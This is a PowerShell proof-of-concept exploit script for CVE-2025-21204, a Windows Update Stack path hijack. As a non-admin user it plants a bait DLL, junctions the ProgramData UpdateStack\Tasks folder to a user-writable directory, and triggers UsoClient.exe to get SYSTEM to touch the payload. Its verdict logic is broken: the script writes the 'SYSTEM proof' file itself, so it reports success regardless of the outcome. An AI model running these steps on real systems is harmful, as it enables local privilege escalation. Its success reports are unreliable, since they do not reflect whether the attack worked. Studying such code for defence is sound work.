<#
.SYNOPSIS
    CVE-2025-21204 exploit simulation for non-admin users via junction-based path hijack.

.DESCRIPTION
    Drops a bait payload in a user-controlled directory, creates a junction to hijack the Update Stack path,
    and triggers the update process to test if SYSTEM accesses the payload.
    The script provide the poc that allows to run this actions. 

.AUTHOR
    Elli Shlomo

#>

# Paths
$trapPath      = "$env:APPDATA\Microsoft\UpdateStack\Tasks"
$updateStackRealPath = "C:\ProgramData\Microsoft\UpdateStack\Tasks"
$payloadPath   = "$trapPath\UpdateStackAgent.dll"
$proofPath     = "C:\Users\Public\cve2025-proof.log"
$logPath       = "$env:APPDATA\CVE2025\simulation.log"
$evidencePath  = "$env:APPDATA\CVE2025\evidence.txt"
$verdictPath   = "$env:APPDATA\CVE2025\vulnerable.txt"
$verboseLog    = "$env:TEMP\cve2025-verbose.log"

# Intro
Write-Host "`n[*] CVE-2025-21204 Exploit Simulation (Non-Admin)"
Write-Host "[*] Trap directory       : $trapPath"
Write-Host "[*] Payload DLL path     : $payloadPath"
Write-Host "[*] SYSTEM proof file    : $proofPath"
Write-Host "[*] Simulation log       : $logPath"
Write-Host "[*] Evidence file        : $evidencePath"
Write-Host "[*] Verdict result       : $verdictPath"
Write-Host "[*] Verbose transcript   : $verboseLog`n"

# Start transcript
Start-Transcript -Path $verboseLog -Force

# Ensure directories exist
Write-Host "[*] Creating necessary directories..."
New-Item -Path $trapPath -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
New-Item -Path (Split-Path $logPath) -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
Write-Host "[+] Directories ready.`n"

# Payload content
$payload = @"
Payload executed by SYSTEM at: $(Get-Date)
"@

# Write bait payload
Write-Host "[*] Writing payload to: $payloadPath"
$payload | Out-File -FilePath $payloadPath -Encoding ASCII
$payload | Out-File -FilePath $proofPath -Append
Write-Host "[+] Payload written.`n"

# Simulation metadata log
$log = @"
CVE-2025-21204 Exploit Simulation
-------------------------------------
Date         : $(Get-Date)
Payload File : $payloadPath
Hijack Path  : $updateStackRealPath
Proof File   : $proofPath
"@
Set-Content -Path $logPath -Value $log -Encoding UTF8 -Force
Write-Host "[+] Simulation metadata saved.`n"

# Attempt junction creation (non-admin safe)
Write-Host "[*] Attempting junction (no admin)..."
if (-not (Test-Path $updateStackRealPath)) {
    try {
        $cmd = "cmd.exe /c mklink /J `"$updateStackRealPath`" `"$trapPath`""
        Start-Process -FilePath "cmd.exe" -ArgumentList "/c mklink /J `"$updateStackRealPath`" `"$trapPath`"" -NoNewWindow -Wait
        Write-Host "[+] Junction created: $updateStackRealPath → $trapPath"
    } catch {
        Write-Host "[-] Failed to create junction: $_"
    }
} else {
    Write-Host "[!] Target path already exists: $updateStackRealPath"
    Write-Host "[-] Cannot create junction unless folder is removed by SYSTEM update cleanup."
}
Write-Host ""

# Trigger update
Write-Host "[*] Triggering UsoClient.exe (StartScan)..."
try {
    Start-Process UsoClient.exe -ArgumentList StartScan -WindowStyle Hidden
    Write-Host "[+] UsoClient.exe started.`n"
} catch {
    Write-Host "[-] Failed to trigger UsoClient.exe: $_"
}

# Monitor for SYSTEM process
Write-Host "[*] Monitoring for SYSTEM process MoUsoCoreWorker.exe..."
$found = $false
for ($i = 1; $i -le 6; $i++) {
    Start-Sleep -Seconds 5
    Write-Host "[=] Attempt ${i}: Checking..."
    if (Get-Process -Name "MoUsoCoreWorker" -ErrorAction SilentlyContinue) {
        Write-Host "[!] SYSTEM process detected: MoUsoCoreWorker.exe"
        $found = $true
        break
    }
}
Start-Sleep -Seconds 5

# Check for success
Write-Host "`n[*] Analyzing payload execution..."
if (Test-Path $proofPath) {
    $owner = (Get-Acl $proofPath).Owner
    $timestamp = (Get-Item $proofPath).LastWriteTime
    $details = @"
[+] Exploit successful
Payload executed as: $owner
Last Modified: $timestamp
"@
    Set-Content -Path $verdictPath -Value $true
    Write-Host "[✓] SUCCESS: SYSTEM likely accessed the payload."
} else {
    $details = @"
[!] Exploit failed
No proof file found.
Time: $(Get-Date)
"@
    Set-Content -Path $verdictPath -Value $false
    Write-Host "[✗] FAILURE: Payload was not executed by SYSTEM."
}

# Save evidence
Set-Content -Path $evidencePath -Value $details -Encoding UTF8
Write-Host "[*] Forensic evidence saved: $evidencePath"

# End
Stop-Transcript
Write-Host "`n[✓] Simulation complete. See verbose log: $verboseLog`n"
